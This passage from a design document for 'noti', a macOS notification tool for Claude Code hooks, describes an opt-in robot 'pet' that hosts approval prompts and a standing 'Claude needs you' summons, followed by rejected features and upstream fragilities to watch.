exactly one question at a glance: *does any session need me, and which?*

**The charter tension, stated plainly:** the charter says "narration fails
the test, always" — and a pet's calm *running* pose is presence-as-narration,
full stop. Opt-in doesn't dissolve that; it only changes who is exposed to
it. So shipping the pet requires **amending the charter itself** with one
carve-out sentence: *an opt-in ambient surface may exist so the summons has
somewhere to stand; everything it shows outside the summons stays inert —
no counts, no progress, no lists.* If that sentence can't be written into
the charter with a straight face at implementation time, the pet doesn't
ship. It remains NOT the rejected dashboard: one critter, one question.

Sketch (all of it gated on a `docs/spikes/` spike first):

- **Surface**: a new `pet` mode of the toast binary — same `.accessory` /
  non-activating / all-Spaces NSPanel DNA as the cards, and the *same frosted
  `.popover` surface* (`makeCard`'s material, 16pt continuous corner, hairline
  border) so the pet reads as a member of the toast family, not a separate app
  icon. Small (72pt robot) at rest; draggable, remembers its corner (re-clamped
  on `didChangeScreenParametersNotification` — an undock must not park it
  off-screen). Never the key window (R3), never emits anything (R1). Default
  character: a little terracotta robot — the identity color already means
  "Claude wants me" from across the room.
- **Singular delivery**: the pet *is* the notification surface, not a mascot
  beside one. Two things unfurl out of the robot, and neither is a second
  decider (R5):
  1. **The live prompt (as built, `pet.attach_prompts`).** When the pet is
     running, `hook_pretooluse` (and the question/plan paths) spawn the *ordinary
     ask toast* in **attached** mode instead of at the corner: the toast wears
     the same robot as its leading icon, sits so that robot tile lands exactly on
     the pet's anchor, and — being at least as tall and wide as the 72pt pet tile
     — fully **occludes** the resting pet beneath it. The card grows into the
     screen room the anchor leaves: horizontally away from the nearer edge, and
     vertically up *or* down (the robot rides the card's top edge at a top-corner
     pet, its bottom edge at a bottom-corner pet) so a tall multi-option question
     never centres itself off the screen. A final clamp keeps the whole card in
     the visible frame even on a small display — trading a few px of robot drift
     (a faint pet ghost) for a card that is always fully visible and answerable. The interactive card unfurls
     horizontally out of the robot and retracts back into it on answer, revealing
     the pet again (now in its post-answer mood) with no handoff seam. This keeps
     R1/R3 intact by construction: the attached card is still the same
     hook-spawned decider process and the only keyboard-armed surface — the pet
     process lends only its position (published live in an `.anchor` file the
     toast reads) and its face. No coordination marker is needed: occlusion, not
     a hide/show dance, is what makes it read as one object. The pet skips the
     corner slot column when attached; a *second* concurrent attached prompt
     overlaps at the same spot (top-answerable first) — the documented edge,
     acceptable because the standing pet still counts all waiting sessions and
     simultaneous prompts-with-a-present-human are rare. Kill-switch back to
     corner toasts: `pet.attach_prompts: false` (R7).
  2. **The standing summons (post-timeout).** If the human is away and the
     attached prompt times out, the robot keeps the glanceable `Claude needs you ·
     <project>` (or `· N sessions`) card — the pet's own decorative unfurl, which
     is what the toast was occluding. This is the whole point: a toast is a knock
     you can miss; the pet is its standing form. The card grows into whichever
     side has room so the robot never leaves its corner. Approve/deny still
     happens on a toast or in the terminal — the pet only stands there asking.
- **State feed**: the pet is a long-lived *reader*, never in any hook path.
  Hooks drop per-session, event-stamped state files (`waiting` / `running` /
  `done` / `failed`) into a state dir; the pet kqueue-watches it (the slot
  re-pack pattern) and shows the most-urgent state. **No mtime heartbeat** —
  unlike slot files, nothing lives to re-touch these between hooks, so a
  10-minute build would go falsely stale. Instead: `waiting` stands for
  `pet.waiting_ttl_seconds` (default 30 min, clamped to ≥ `ask_timeout + 30`).
  The original sketch bounded it at `ask_timeout + 30` — but that expired the
  standing summons 30s after the toast died, while the prompt it announces
  kept waiting in the terminal; a summons bounded by the *toast's* lifetime
  contradicts "the pet is the standing form of the summons", so the bound is
  now "away from desk". `running` never expires (a stale "running" from a
  killed session costs a calm pose, not a false summons); `done` decays fast
  to asleep; `failed` is a summons and stands on the waiting TTL. Known blind spot, documented on purpose: no hook fires
  when a terminal prompt is *answered*, so `waiting` clears only at the
  session's next PreToolUse/Stop — self-healing and usually seconds-fast
  (the approved tool's own PreToolUse, or Stop). The one true stale case is
  a session killed with a prompt pending: its false summons dies at the TTL. Hook
  writes are best-effort: a failed write degrades to a wrong-mood pet, never
  a blocked session.
- **States**: *waiting on you* (the live attached prompt is unfurled out of the
  robot and occluding the pet; once it times out, the pet's own `Claude needs you`
  card stands in its place, project/count named plus how long it has stood
  (`noti · 4m`, oldest wait when several stand) — the whole point) · *running*
  (calm resting robot, no words) · *done* (brief ✓, then rest) · *turn failed*
  (alarmed, presents a card, pairs with StopFailure) · *no sessions* (asleep).
  Only a summons (`waiting`/`failed`) presents the card; every resting state
  stays inert — no counts, no project names — per the charter carve-out. Each state keeps a distinct static robot pose so
  reduce-motion loses only the motion — the unfurl and the idle life (beacon
  breath, blink, gaze, sleep-z, mood reactions) — never the meaning. Clicking a standing
  summons focuses the terminal that owns it (answered 2026-07-08 by
  `docs/spikes/spike-focus.sh`, feasible-with-cost): the hook's ppid walk
  stamps the session's TTY + terminal app into the waiting/failed state file
  (`cwd` alone was ambiguous — the ancestry isn't), the pet focuses the
  Terminal.app tab whose `tty` matches via AppleScript, falls back to plain
  app activation (iTerm2/VS Code/ssh chains), and by design does NOTHING when
  identity wasn't captured — never focus a guessed window. Cost: a one-time
  Automation consent for the toast binary on first click. R7 kill-switch:
  `pet.focus_terminal`.
- **Personality without a pipeline**: frames are embedded sprite data
  (zero-dep holds); `pet.sprite` may point at a user-supplied sprite-sheet
  PNG — validated on load, silent fallback to the embedded default —
  hatching-by-AI is out of scope, drawing your own is not.
- **Lifecycle**: summoned/dismissed by `noti pet`, detached from its shell
  (the `toast_summary` `start_new_session` pattern); killed by
  `noti uninstall`; no launchd, so no reboot persistence — you re-summon it,
  and that price is documented rather than papered over.
- **Spike questions**: sprite frames vs CALayer vector poses (answered in
  practice: parametric vector poses + render-server layers, no sprite
  pipeline); CPU/battery of an always-on surface (answered 2026-07-08: all
  repeating motion is render-server CAAnimation, blinks are one-shot timers —
  0.1% CPU awake, 0.0% asleep); one pet vs per-session pets when several
  sessions wait at once (until resolved, the click card may name more than
  one); terminal-focus feasibility (answered 2026-07-08, feasible-with-cost —
  see the States bullet and `docs/spikes/spike-focus.sh`); whether the pet
  ever suppresses a toast (current answer: never — different surface class,
  R5 satisfied by design).

**Rejected**, with reasons, so they don't get re-litigated:

- Session dashboard / multi-session overview — herdr's job. (The pet above
  is not this: one critter, one question, no lists.)
- Linux/Windows port — AppKit *is* the zero-dependency bet.
- Hands-off keyboard answers (no hover-arm) — the arming gesture is the
  keystroke-safety design, not friction to sand off.
- Toast history / log viewer — the terminal scrollback is the record.
- Auto-retry on PermissionDenied — policy, not notification.

## Upstream fragilities to watch

- **`updatedInput` non-label answers** are spike-verified observed behavior,
  not documented API. If a future Claude Code rejects them, flip
  `approval.question_other: false` (the R7 precedent).
- **The hook inventory drifts.** The table above is stamped 2026-09-09;
  re-verify an event against the live docs before implementing its row. The
  2026-07 stamp went four releases stale and cost a wrong verdict
  (`PermissionDenied`) plus a false premise in `evaluate()` — re-verification
  is the cheapest correctness work in this repo.
- **Claude's Bash matcher is the spec, and it moves.** C2–C4 exist because
  noti reimplements a matcher that is documented, versioned, and not ours.
  Re-read the compound-command, wrapper, and read-only-command sections of the
  permissions doc before touching `_bash_match`, and treat any divergence where
  noti is broader as a security bug, not a style difference.
- **Auto mode's decision order is not noti's to model.** Protected paths,
  critical paths, trusted infrastructure, and conversational boundaries all
  steer the classifier and are invisible at PreToolUse time. C1 defers rather
  than predicts for this reason; any future "smart" auto-mode toast must
  explain how it avoids guessing at state it cannot see (R8).
- **`stop_hook_active` semantics** — matters only if R2 is ever revisited;
  document, don't rely.
- **Notification sub-types** — `agent_needs_input`/`agent_completed` are new
  (v2.1.198+) and may still move; the investigate verdicts assume they settle.
